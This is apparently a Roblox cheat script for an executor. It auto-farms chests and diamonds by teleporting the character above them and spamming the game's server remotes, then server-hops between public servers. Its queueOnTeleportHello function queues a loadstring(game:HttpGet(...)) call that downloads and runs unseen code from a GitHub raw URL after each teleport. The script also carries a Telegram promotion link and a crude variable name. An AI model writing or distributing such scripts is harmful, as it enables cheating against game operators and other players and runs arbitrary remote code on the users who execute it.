-- LocalScript: Chest opener (hover) + Exact Diamond priority + Server hop using remotes
task.spawn(function()
    local rs = game:GetService("RunService")
local penis = game:GetService("Players")
local player = penis.LocalPlayer
--[[t.me/TheBestKatana]]
rs.RenderStepped:Connect(function()
    player.GameplayPaused = false
end)
end)
-- =============== Settings ===============
local CHEST_KEYWORD = "chest"           -- model names containing "chest" (case-insensitive)
local DIAMOND_NAME = "Diamond"          -- exact name match for diamonds
local Y_OFFSET = 10                     -- hover height
local HOVER_CHEST_TIME = 1              -- seconds to hover above each chest
local ITEMS_CONTAINER = workspace:WaitForChild("Items", 5) or workspace
local CHEST_OPEN_INTERVAL = 0.25        -- how often to fire the open-chest remote while hovering
local DIAMOND_TAKE_INTERVAL = 0.2       -- how often to fire the take-diamond remote / click while farming
local SEARCH_DIAMOND_DEEP = false       -- set to true if Diamonds can be nested deeper than Items' direct children
-- =======================================

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

-- Remotes
local RemoteEvents = ReplicatedStorage:WaitForChild("RemoteEvents")
local OpenChestRE = RemoteEvents:WaitForChild("RequestOpenItemChest")
local TakeDiamondRE = RemoteEvents:WaitForChild("RequestTakeDiamonds")

-- -------------- Utils --------------
local function containsIgnoreCase(str, sub)
    if type(str) ~= "string" or type(sub) ~= "string" then return false end
    return string.find(string.lower(str), string.lower(sub), 1, true) ~= nil
end

local function getCharacter()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    character:WaitForChild("HumanoidRootPart", 10)
    character:WaitForChild("Humanoid", 10)
    return character
end

local function getTargetCFrame(inst)
    if not inst then return nil end
    if inst:IsA("Model") then
        local ok, cf = pcall(function() return inst:GetPivot() end)
        if ok and cf then return cf end
        local part = inst:FindFirstChildWhichIsA("BasePart", true)
        return part and part.CFrame or nil
    elseif inst:IsA("BasePart") then
        return inst.CFrame
    else
        local part = inst:FindFirstChildWhichIsA("BasePart", true)
        return part and part.CFrame or nil
    end
end

local function findClickDetector(container)
    if not container then return nil end
    if container:IsA("ClickDetector") then return container end
    if container:IsA("BasePart") then
        local cd = container:FindFirstChildWhichIsA("ClickDetector")
        if cd then return cd end
    end
    for _, d in ipairs(container:GetDescendants()) do
        if d:IsA("ClickDetector") then
            return d
        end
    end
    return nil
end

local function hoverTeleport(inst, durationSeconds, action, actionInterval)
    local character = getCharacter()
    if not character or not inst then return end

    local endTime = durationSeconds and (tick() + durationSeconds) or math.huge
    local lastActionTime = 0

    while tick() < endTime do
        if not inst:IsDescendantOf(workspace) then break end

        local targetCF = getTargetCFrame(inst)
        if not targetCF then break end

        character:PivotTo(targetCF + Vector3.new(0, Y_OFFSET, 0))

        if action and actionInterval then
            local now = tick()
            if now - lastActionTime >= actionInterval then
                pcall(action)
                lastActionTime = now
            end
        end

        RunService.Heartbeat:Wait()
    end
end

-- -------------- Remotes --------------
local function openChestRemote(chestModel)
    pcall(function()
        OpenChestRE:FireServer(chestModel)
    end)
end

local function takeDiamondRemote(diamondInst)
    pcall(function()
        TakeDiamondRE:FireServer(diamondInst)
    end)
end

-- -------------- Finders --------------
local function getNextChest(processedMap)
    if not ITEMS_CONTAINER or not ITEMS_CONTAINER.Parent then return nil end
    for _, inst in ipairs(ITEMS_CONTAINER:GetChildren()) do
        if inst:IsA("Model") and containsIgnoreCase(inst.Name, CHEST_KEYWORD) then
            if not processedMap[inst] then
                return inst
            end
        end
    end
    return nil
end

local function findDiamondExact()
    if not ITEMS_CONTAINER or not ITEMS_CONTAINER.Parent then return nil end

    if SEARCH_DIAMOND_DEEP then
        for _, inst in ipairs(ITEMS_CONTAINER:GetDescendants()) do
            if inst.Name == DIAMOND_NAME then
                return inst
            end
        end
    else
        for _, inst in ipairs(ITEMS_CONTAINER:GetChildren()) do
            if inst.Name == DIAMOND_NAME then
                return inst
            end
        end
    end

    return nil
end

-- -------------- Actions --------------
local function visitChestWithHoverAndOpen(chest)
    if not chest or not chest:IsDescendantOf(workspace) then return false end
    hoverTeleport(chest, HOVER_CHEST_TIME, function()
        openChestRemote(chest)
    end, CHEST_OPEN_INTERVAL)
    return true
end

local function farmDiamondUntilGone(diamondInst)
    if not diamondInst or not diamondInst:IsDescendantOf(workspace) then return end

    -- Keep hovering and taking the diamond until it disappears
    while diamondInst and diamondInst:IsDescendantOf(workspace) do
        hoverTeleport(diamondInst, 0.2, function()
            takeDiamondRemote(diamondInst)
            -- Also try ClickDetector if present
            local cd = findClickDetector(diamondInst)
            if cd and typeof(fireclickdetector) == "function" then
                pcall(function() fireclickdetector(cd) end)
            end
        end, DIAMOND_TAKE_INTERVAL)
        task.wait()
    end
end

-- -------------- Teleport re-exec (your function) --------------
local function queueOnTeleportHello()
    local suc, err = pcall(function()
        queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/t3rm1n4tor/KATANAAA.WTF/main/h',true))();")
    end)
    if suc then
        warn("executed autoinject")
    elseif err then
        error(tostring(err))
    end
end

-- -------------- SIMPLIFIED Server Hop (guaranteed to work) --------------
local function serverHop()
    local placeId = game.PlaceId
    local currentJobId = game.JobId
    local MAX_SERVERS_TO_TRACK = 5 -- Keep only last 5 servers to avoid running out
    
    -- Queue your script for teleport
    queueOnTeleportHello()
    
    -- Track recently visited (only a few to make sure we don't stall)
    local recentServers = {}
    local hasFS = (typeof(isfile) == "function" and typeof(readfile) == "function" and typeof(writefile) == "function")
    
    -- Very simple server tracking - only remembers a few servers
    if hasFS then
        if isfile("last_servers.txt") then
            pcall(function()
                local content = readfile("last_servers.txt")
                if #content > 0 then
                    for id in string.gmatch(content, "[^,]+") do
                        table.insert(recentServers, id)
                    end
                end
            end)
        end
    end
    
    -- Add current server to skip list
    table.insert(recentServers, currentJobId)
    
    -- Trim to max length
    while #recentServers > MAX_SERVERS_TO_TRACK do
        table.remove(recentServers, 1)
    end
    
    -- Save updated list
    if hasFS then
        pcall(function()
            writefile("last_servers.txt", table.concat(recentServers, ","))
        end)
    end

    -- Function to check if a server is in our recently visited list
    local function wasRecentlyVisited(jobId)
        for _, id in ipairs(recentServers) do
            if id == jobId then
                return true
            end
        end
        return false
    end
    
    -- Get servers (http service or executor http)
    local function getServers()
        local ok, result
        local order = (math.random(1, 2) == 1) and "Asc" or "Desc"
        local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&limit=100", placeId, order)
        
        ok, result = pcall(function()
            return HttpService:JSONDecode(HttpService:GetAsync(url))
        end)
        
        if not ok and result then
            local req = (syn and syn.request) or http_request or request
            if req then
                local res = req({Url = url, Method = "GET"})
                if res and res.StatusCode == 200 then
                    ok, result = pcall(function()
                        return HttpService:JSONDecode(res.Body)
                    end)
                end
            end
        end
        
        return ok and result and result.data or {}
    end
    
    -- Simple retry loop for server hopping
    local function hopWithRetries(maxTries)
        for attempt = 1, maxTries do
            warn("Hop attempt #" .. attempt)
            
            -- Get list of servers 
            local servers = getServers()
            if #servers == 0 then
                warn("No servers found, retrying...")
                task.wait(1)
                continue
            end
            
            -- Find eligible servers (not recently visited, not current, not full)
            local candidates = {}
            for _, server in ipairs(servers) do
                if server and server.id ~= currentJobId and 
                   not wasRecentlyVisited(server.id) and
                   server.playing < server.maxPlayers then
                    table.insert(candidates, server.id)
                end
            end
            
            -- If no eligible servers, clear our tracking except current
            if #candidates == 0 then
                warn("No eligible servers, clearing history")
                recentServers = {currentJobId}
                if hasFS then
                    pcall(function() 
                        writefile("last_servers.txt", currentJobId)
                    end)
                end
                task.wait(1)
                continue
            end
            
            -- Pick a random server from candidates
            local targetId = candidates[math.random(1, #candidates)]
            
            -- Try to teleport
            warn("Teleporting to: " .. targetId)
            local ok = pcall(function()
                TeleportService:TeleportToPlaceInstance(placeId, targetId, LocalPlayer)
            end)
            
            if ok then
                -- Success! Wait for teleport to complete
                task.wait(5)
                warn("Teleport appears stuck - retrying")
            else
                -- Failed to initiate teleport
                warn("Teleport call failed, retrying...")
                task.wait(1)
            end
        end
        
        -- Last resort: If we got here, just try teleporting to place with no specific server
        warn("Maximum retries reached, using generic teleport")
        pcall(function()
            TeleportService:Teleport(placeId, LocalPlayer)
        end)
    end
    
    -- Handle teleport failures
    local failConn = TeleportService.TeleportInitFailed:Connect(function(player, _, _)
        if player == LocalPlayer then
            warn("Teleport init failed")
        end
    end)
    
    -- Clean up connection after a while
    task.delay(30, function()
        if failConn then
            failConn:Disconnect()
        end
    end)
    
    -- Start retry loop
    task.spawn(function() 
        hopWithRetries(10)
    end)
end

-- -------------- Coordinator --------------
local state = {
    processedChests = {},
    pauseForDiamond = false,
    serverHopStarted = false,
}

-- Initial death/HasDied check loop -> hop if true
while task.wait(0.5) do
    local ss = game.Players.LocalPlayer:GetAttribute("HasDied")
    if ss then
        state.serverHopStarted = true
        serverHop()
        print("hop")
        break
    elseif game.Players.LocalPlayer.Character ~= nil and ss == nil then
        warn("alive")
        break
    end
end

-- Diamond watcher: exact name "Diamond" only
task.spawn(function()
    while not state.serverHopStarted do
        if not state.pauseForDiamond then
            local diamond = findDiamondExact()
            if diamond and diamond:IsDescendantOf(workspace) then
                state.pauseForDiamond = true
                pcall(function()
                    farmDiamondUntilGone(diamond)
                end)
                state.pauseForDiamond = false
            end
        end
        task.wait(0.2)
    end
end)

-- Chest runner: hover for 1s per chest (looped TP), opening via remote
task.spawn(function()
    task.wait(0.5) -- small startup delay

    while true do
        while state.pauseForDiamond do
            RunService.Heartbeat:Wait()
        end

        local chest = getNextChest(state.processedChests)
        if not chest then
            break
        end

        local ok = pcall(function()
            visitChestWithHoverAndOpen(chest)
        end)
        if ok then
            state.processedChests[chest] = true
        end

        task.wait(0.1)
    end

    -- All chests done → hop
    state.serverHopStarted = true
    serverHop()
end)
